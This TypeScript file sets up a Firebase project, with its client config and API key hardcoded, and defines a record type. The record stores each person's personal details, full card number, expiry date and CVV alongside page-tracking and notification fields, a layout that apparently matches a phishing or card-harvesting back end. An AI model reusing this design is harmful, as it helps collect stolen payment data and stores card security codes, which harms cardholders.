import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: "AIzaSyAPk6FOIwxX0YgHtpRsknnrU5AuNaQaLV0",
  authDomain: "newprojectsamak.firebaseapp.com",
  projectId: "newprojectsamak",
  storageBucket: "newprojectsamak.firebasestorage.app",
  messagingSenderId: "714671646510",
  appId: "1:714671646510:web:4967e1466fd561edb7bcbf",
  measurementId: "G-Q05X22RT8R"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
